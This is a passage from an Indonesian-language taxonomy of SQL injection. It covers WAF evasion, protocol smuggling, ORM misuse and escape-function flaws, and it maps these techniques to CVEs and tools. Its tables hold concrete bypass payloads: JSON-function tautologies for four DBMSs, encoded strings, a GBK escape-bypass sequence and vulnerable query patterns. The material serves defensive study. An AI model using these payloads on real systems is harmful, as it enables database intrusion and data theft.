| **String Tanpa Kutipan** | Bypass filter kutipan | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| **Obfuscation Function Call** | Whitespace/komentar antara nama fungsi dan tanda kurung | `SLEEP/**/(5)`, `VERSION ()` |

### §7-2. Bypass WAF SQL Berbasis JSON

Sintaks SQL JSON tidak dikenali oleh parser SQL WAF, memungkinkan teknik yang **melewati semua WAF komersial utama** (ditemukan 2022 — mempengaruhi Palo Alto, AWS, Cloudflare, F5, Imperva).

| Subtipe | DBMS | Contoh Payload |
|---------|------|----------------|
| **JSON_EXTRACT Tautology** | MySQL | `1 OR JSON_EXTRACT('{"a":1}','$.a')=1` |
| **Perbandingan Array JSON** | PostgreSQL | `1 OR '{"a":1}'::jsonb @> '{"a":1}'::jsonb` |
| **JSON_VALUE** | MSSQL | `1 OR JSON_VALUE('{"a":1}','$.a')=1` |
| **json_extract** | SQLite | `1 OR json_extract('{"a":1}','$.a')=1` |
| **Kondisi JSON Bertingkat** | Universal | Mencampur operator JSON dengan keyword SQL tradisional untuk memecah pola signature |

> Sintaks SQL JSON didukung di MySQL (2015), PostgreSQL (2012), MSSQL (2016), dan SQLite (2022). Masalah fundamental adalah WAF gagal mem-parse sintaks SQL dalam konten JSON.

### §7-3. Pengelakan di Level HTTP

Mengeksploitasi karakteristik protokol HTTP untuk membingungkan parsing request WAF.

| Subtipe | Mekanisme | Teknik |
|---------|-----------|--------|
| **Manipulasi Content-Type** | Mengirim Content-Type yang tidak terduga | `application/json` sebagai ganti `application/x-www-form-urlencoded` |
| **[[Chunked Transfer Encoding]]** | Mendistribusikan signature antar chunk | Fragmentasi payload melalui chunked encoding |
| **HTTP Parameter Pollution** | Kebingungan parameter duplikat (lihat §4-1) | Nilai pertama lolos WAF, nilai kedua mencapai aplikasi |
| **Manipulasi Multipart Boundary** | Perbedaan parser melalui boundary non-standar | Variasi string boundary data form multipart |
| **Payload Berukuran Besar** | Melebihi batas byte inspeksi WAF | Menambahkan data dummy berukuran besar sebelum payload |
| **Header Spesifik HTTP/2** | Mengeksploitasi binary framing HTTP/2 | Manipulasi pseudo-header dalam HTTP/2 |

---

## §8. Mutasi di Level Protokol & Arsitektur

Mutasi yang mengeksploitasi karakteristik **wire protocol database**, **lapisan driver/ORM**, dan **arsitektur aplikasi** — BUKAN sintaks SQL. Ini mewakili attack surface baru yang tidak dapat diblokir oleh pertahanan SQL Injection tradisional (Prepared Statement).

### §8-1. Wire Protocol Smuggling

**Merusak batas pesan** dalam protokol biner antara database client dan server, memungkinkan injection statement SQL/NoSQL arbitrer bahkan di lingkungan yang menggunakan Prepared Statement. (DEF CON 32, 2024)

| Subtipe | Mekanisme | Kondisi Kunci |
|---------|-----------|---------------|
| **Message Size Overflow** | Overflow field panjang pesan protokol melalui string 4GB+ | CVE-2024-27304 (pgx): overflow field panjang 32-bit memungkinkan manipulasi pesan berikutnya |
| **Protocol Desynchronization** | Ketidakcocokan batas pesan antara client dan server | Kebingungan urutan pesan aplikasi-DB → penyisipan pesan berbahaya |
| **Kerentanan Driver** | Cacat implementasi dalam driver spesifik bahasa | CVE-2024-1597 (PostgreSQL JDBC): SQL injection saat preferQueryMode=simple |

> [[Protocol smuggling]] menerapkan konsep [[HTTP Request Smuggling]] ke protokol DB biner, membuktikan bahwa Prepared Statement bukanlah solusi mutlak. Cakupan dampak meluas di luar protokol DB ke semua protokol biner termasuk message queue dan caching.

### §8-2. Bypass Lapisan [[ORM]]/Framework

Mencapai SQL injection melalui **API tidak aman** di lapisan abstraksi ORM (Object-Relational Mapper).

| Subtipe | Framework | Pola Rentan |
|---------|-----------|-------------|
| **Raw Query Abuse** | Django, Rails, Sequelize | `MyModel.objects.raw("SELECT * FROM t WHERE id="+user_input)` |
| **Penyalahgunaan extra()/annotate() (Django)** | Django | `QuerySet.extra(where=["name='"+input+"'"])` — tidak diparameterisasi |
| **Metode ActiveRecord Tidak Aman** | Ruby on Rails | `where("name = '#{params[:name]}'")`, `order(params[:sort])` |
| **Comment Injection (ActiveRecord)** | Rails | CVE-2023-22794: escape komentar SQL melalui `annotate()`, `optimizer_hints()` |
| **Sequelize Operator Injection** | Node.js Sequelize | Injection operator `$where`, `$like` untuk manipulasi kondisi |
| **JPQL/HQL Injection** | Hibernate/JPA | `"FROM User WHERE name='"+input+"'"` — JPQL juga dapat diinjeksi |
| **Nama Kolom/Tabel Dinamis** | Semua ORM | Identifier (nama tabel, nama kolom) tidak dapat diparameterisasi melalui [[Prepared Statement]] |

### §8-3. Celah Fungsi Escape

Injection yang disebabkan oleh **bug implementasi** dalam fungsi escape string itu sendiri.

| Subtipe | Mekanisme | CVE/Kasus |
|---------|-----------|-----------|
| **Serangan Encoding Multibyte (GBK)** | Backslash dari `addslashes()` diserap sebagai bagian dari karakter multibyte GBK | `%bf%27` → `%bf%5c%27` → `縗'` (backslash dikonsumsi) |
| **Kegagalan Validasi UTF-8** | Urutan UTF-8 tidak valid melewati logika escape | CVE-2025-1094: celah pemrosesan UTF-8 di PQescapeLiteral() PostgreSQL |
| **NO_BACKSLASH_ESCAPES** | Perilaku escape berubah dengan SQL mode MySQL | Escaping backslash tidak valid dalam mode `NO_BACKSLASH_ESCAPES` |
| **Ketidakcocokan Charset** | Ketidakcocokan charset client/server melewati escaping | Serangan multibyte setelah `SET NAMES 'gbk'` |
| **PDO Prepared Statement Null Byte** | Prepared statement yang diemulasikan PDO salah mem-parse null byte (`\0`) di batas urutan escape, menyebabkan penggantian placeholder desinkronisasi dan menginjeksi fragmen SQL yang dikontrol penyerang ke dalam query | Memerlukan `PDO::ATTR_EMULATE_PREPARES = true` (default dalam beberapa konfigurasi); null byte dalam nilai parameter memisahkan konteks escape |

---

## Pemetaan Skenario Serangan (Sumbu 3)

| Skenario | Kondisi Arsitektur | Kategori Mutasi Utama |
|----------|-------------------|----------------------|
| **Authentication Bypass** | Manipulasi clause WHERE form login | §1-1 + §2-3 + §6-2 |
| **Eksfiltrasi Data Massal** | Output hasil SELECT tersedia | §1-2 + §3 + §5-4 |
| **Ekstraksi Data Blind** | Lingkungan tanpa output | §5-1 + §5-2 + §5-3 |
| **Remote Code Execution** | Hak akses DB tinggi, file write tersedia | §1-3 + §3-1/§3-2/§3-3 |
| **Bypass Lingkungan WAF** | WAF komersial terpasang | §2 + §7-1 + §7-2 + §7-3 |
| **Bypass Prepared Statement** | Query terparameterisasi digunakan | §8-1 + §8-2 + §8-3 |
| **Serangan Second-Order** | Arsitektur simpan-lalu-referensikan | §6-1 + §1-1 |
| **Serangan Lingkungan Cloud** | Managed DB + kombinasi WAF | §7-2 + §4-3 + §8-2 |

---

## Pemetaan [[CVE]] / Bug Bounty (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
|-----------------|------------|----------------|
| §8-1 (Protocol Smuggling) | CVE-2024-27304 (driver pgx PostgreSQL) | Eksekusi SQL arbitrer di lingkungan Prepared Statement. Auth bypass, eksfiltrasi data, RCE |
| §8-3 (Celah Escape UTF-8) | CVE-2025-1094 (PostgreSQL libpq) | [[CVSS]] 8.1. SQL injection memungkinkan bahkan dengan input yang di-escape. Dirantai dengan BeyondTrust CVE-2024-12356 |
| §8-1 (Kerentanan Driver) | CVE-2024-1597 (driver JDBC PostgreSQL) | SQL injection saat preferQueryMode=simple. CVSS 9.8 |
| §3-1 + §1-3 (MySQL RCE) | CVE-2025-25257 (Fortinet FortiWeb) | CVSS 9.6. SQLi tanpa auth → SELECT INTO OUTFILE → Python RCE. [[PoC]] dipublikasikan |
| §1-2 + §6-2 (UNION + INSERT) | CVE-2024-36412 (SuiteCRM) | Akses DB penuh tanpa autentikasi. Rating kritis |
| §1-3 (Stacked Queries) | CVE-2024-45387 (Apache Traffic Control) | CVSS 9.9. Eksekusi SQL arbitrer oleh pengguna berprevilese melalui request PUT |
| §7-2 (Bypass WAF SQL JSON) | Penelitian Claroty Team82 (2022) | Melewati WAF Palo Alto, AWS, Cloudflare, F5, Imperva |
| §8-2 (ORM Comment Injection) | CVE-2023-22794 (Rails ActiveRecord) | Escape komentar SQL melalui annotate() |
| §8-2 (ORM Injection) | CVE-2024-42005 (Django) | Kerentanan SQL injection Django ORM |
| §8-3 (Serangan Encoding GBK) | CVE-2006-2753 (MySQL) | addslashes() + bypass escape encoding multibyte GBK (historis tetapi pola berulang) |
| §3-1 (Full-Text Search Oracle) | Penelitian ReDisclosure (2025) | Parsing boolean full-text MySQL disalahgunakan untuk mengubah endpoint berbasis redirect menjadi oracle inferensi blind; ekstraksi data baru melalui `MATCH ... AGAINST` |
| §8-3 (PDO Null Byte) | Penelitian slcyber.io (2025) | SQL injection melalui kesalahan parsing null byte pada prepared statement PDO; melewati perlindungan query terparameterisasi dalam mode emulated prepare |

---

## Alat Deteksi

### Alat Ofensif

| Alat | Cakupan Target | Teknik Inti |
|------|---------------|-------------|
| **SQLMap** | Semua DBMS utama. Deteksi/ekstraksi/RCE otomatis | Boolean/Time/Error/Union/Stacked — semua teknik + 60+ tamper script |
| **Ghauri** | Alternatif SQLMap lintas platform | Pergantian teknik otomatis, emulasi browser, bypass canggih |
| **jSQL Injection** | Pengujian SQLi berbasis GUI | Antarmuka visual, berbagai strategi injection, Java 11-17 |
| **SQLMutant** | Mutasi payload khusus | Pencocokan pola, analisis error, kombinasi timing attack |
| **Havij** | Alat SQLi otomatis (Windows) | Berbasis GUI, fingerprinting DB otomatis, ekstraksi data |
| **NoSQLMap** | Khusus NoSQL injection | Menargetkan MongoDB, CouchDB |
| **Blisqy** | SQLi Blind berbasis header HTTP | SQLi blind berbasis waktu melalui header HTTP |

### Alat Defensif

| Alat | Cakupan Target | Teknik Inti |
|------|---------------|-------------|
| **ModSecurity + CRS** | WAF open-source | Pencocokan signature OWASP Core Rule Set |
| **libinjection** | Library analisis token SQL | Deteksi injection melalui tokenisasi SQL (analisis sintaks, bukan signature) |
| **sqlc / Alat [[SAST]]** | Analisis statis | Mendeteksi konstruksi SQL tidak aman dalam kode sumber |
| **Snyk / Dependabot** | Keamanan dependensi | Pemantauan CVE kerentanan ORM/driver |

### Alat Riset

| Alat | Cakupan Target | Teknik Inti |
|------|---------------|-------------|
| **SQLMap Tamper Scripts** | Riset bypass WAF | 60+ script encoding/obfuscation (randomcase, space2comment, charunicodeencode, dll.) |
| **SqliGPT** | Deteksi SQLi berbasis LLM | Deteksi SQLi black-box melalui large language model (riset akademik) |
| **Burp Suite + Hackvertor** | Pengujian SQLi manual | Transformasi encoding real-time, intercept proxy |

---

## Ringkasan: Prinsip Inti

### Akar Masalah: Percampuran Kode-Data

Alasan fundamental SQL Injection bertahan lebih dari dua dekade adalah bahwa desain SQL **mencampur kode (perintah) dan data (nilai) dalam saluran yang sama**. Ketika input pengguna digabungkan ke dalam string SQL, parser tidak dapat membedakan apakah itu data atau perintah. Percampuran fundamental ini meluas di luar sintaks SQL berbasis teks ke wire protocol biner (§8-1), abstraksi ORM (§8-2), dan fungsi escape (§8-3).

### Mengapa Patch Bertahap Gagal

Setiap lapisan pertahanan hanya memblokir kategori mutasi tertentu sementara membiarkan yang lain terekspos:
- **Prepared Statement**: Memblokir sebagian besar §1–§6, tetapi tidak dapat mempertahankan dari §8-1 (protocol smuggling), §8-2 (ORM unsafe API), §6-2 (identifier dinamis)
- **WAF**: Memblokir pola yang dikenal dalam §1, tetapi terus-menerus dilewati oleh §2 (mutasi encoding), §7-2 (SQL JSON), §7-3 (pengelakan level HTTP)
- **ORM**: API default aman, tetapi raw query, extra(), dan metode tidak aman ada, memberikan pengembang **rasa aman yang palsu**
- **Validasi Input**: Daftar blokir dilewati oleh §2 (encoding); daftar izin sulit diterapkan di semua jalur input (§4)

### Arah Solusi Struktural

Solusi fundamental adalah **menegakkan pemisahan kode-data di setiap lapisan**:
1. **Lapisan Query**: Default ke Prepared Statement / query terparameterisasi; terapkan daftar izin untuk identifier dinamis
2. **Lapisan Protokol**: Perkuat verifikasi integritas pesan protokol biner (cegah overflow field panjang)
3. **Lapisan Framework**: Hapus atau wajibkan opt-in eksplisit untuk ORM unsafe API
4. **Lapisan Operasional**: Prinsip [[least privilege]] (batasi izin user DB, nonaktifkan akses file), tekan pesan error
5. **Lapisan Monitoring**: Defense-in-depth yang menggabungkan WAF + runtime [[RASP]] + deteksi berbasis perilaku

Tidak ada satu langkah pertahanan yang dapat mencakup seluruh ruang mutasi SQL Injection — hanya **[[Defense-in-depth]]** yang merupakan solusi realistis.

---

*Dokumen ini dibuat untuk tujuan riset keamanan defensif dan pemahaman kerentanan.*

---

## Referensi

### Sumber Dasar

| # | Judul | URL |
|---|-------|-----|
| [1] | SQL Injection \| OWASP Foundation | https://owasp.org/www-community/attacks/SQL_Injection |
| [2] | What is SQL Injection? Tutorial & Examples \| PortSwigger Web Security Academy | https://portswigger.net/web-security/sql-injection |

### CVE / Saran Kerentanan

| # | CVE | Judul | URL |
|---|-----|-------|-----|
| [3] | CVE-2024-27304 | Driver PostgreSQL pgx — Overflow Ukuran Pesan Protokol | https://nvd.nist.gov/vuln/detail/CVE-2024-27304 |
| [4] | CVE-2025-1094 | Celah Validasi UTF-8 API Quoting libpq PostgreSQL | https://www.postgresql.org/support/security/CVE-2025-1094/ |
| [5] | CVE-2024-1597 | SQL Injection Driver JDBC PostgreSQL (PreferQueryMode=SIMPLE) | https://www.postgresql.org/about/news/postgresql-jdbc-4272-4261-4255-4244-4239-42228-and-42228jre7-security-update-for-cve-2024-1597-2812/ |
| [6] | CVE-2025-25257 | SQLi Pre-Auth ke RCE Fortinet FortiWeb | https://labs.watchtowr.com/pre-auth-sql-injection-to-rce-fortinet-fortiweb-fabric-connector-cve-2025-25257/ |
| [7] | CVE-2024-36412 | SQL Injection Tanpa Autentikasi SuiteCRM | https://nvd.nist.gov/vuln/detail/CVE-2024-36412 |
| [8] | CVE-2024-45387 | SQL Injection Apache Traffic Control via Request PUT | https://nvd.nist.gov/vuln/detail/cve-2024-45387 |
| [9] | CVE-2023-22794 | SQL Injection Rails ActiveRecord via Komentar | https://discuss.rubyonrails.org/t/cve-2023-22794-sql-injection-vulnerability-via-activerecord-comments/82117 |
| [10] | CVE-2024-42005 | SQL Injection ORM Django via Kunci JSONField | https://nvd.nist.gov/vuln/detail/cve-2024-42005 |
| [11] | CVE-2006-2753 | Bypass Escape Encoding Multibyte MySQL (GBK) | https://nvd.nist.gov/vuln/detail/CVE-2006-2753 |
| [12] | CVE-2024-12356 | Command Injection BeyondTrust PRA/RS (dirantai dengan CVE-2025-1094) | https://www.rapid7.com/db/vulnerabilities/beyondtrust-pra-cve-2024-12356-remote/ |

### Riset & Presentasi Konferensi

| # | Judul | Penulis/Sumber | URL |
|---|-------|---------------|-----|
| [13] | SQL Injection Isn't Dead: Smuggling Queries at the Protocol Level | Paul Gerste, DEF CON 32 (2024) | https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf |
| [14] | {JS-ON: Security-OFF}: Abusing JSON-Based SQL to Bypass WAF | Claroty Team82 (2022) | https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf |

### Alat Ofensif

| # | Alat | Repositori |
|---|------|-----------|
| [15] | SQLMap — Alat Otomatis SQL Injection dan Database Takeover | https://github.com/sqlmapproject/sqlmap |
| [16] | Ghauri — Deteksi dan Eksploitasi SQL Injection Tingkat Lanjut | https://github.com/r0oth3x49/ghauri |
| [17] | jSQL Injection — Alat SQL Injection Otomatis Berbasis Java | https://github.com/ron190/jsql-injection |
| [18] | NoSQLMap — Injection dan Eksploitasi NoSQL Otomatis | https://github.com/codingo/NoSQLMap |
| [19] | Blisqy — SQL Injection Blind Berbasis Waktu via Header HTTP | https://github.com/JohnTroony/Blisqy |

### Alat Defensif

| # | Alat | Repositori |
|---|------|-----------|
| [20] | ModSecurity — Engine Web Application Firewall Open Source | https://github.com/owasp-modsecurity/ModSecurity |
| [21] | OWASP Core Rule Set (CRS) — Aturan Deteksi Serangan Generik | https://github.com/coreruleset/coreruleset |
| [22] | libinjection — Tokenizer Parser Analyzer SQL/SQLI | https://github.com/libinjection/libinjection |

### Riset Tambahan

- Doyensec: "Apache Pinot SQLi and RCE Cheat Sheet" (2022) — Rantai SQL injection dan remote code execution di engine query Apache Pinot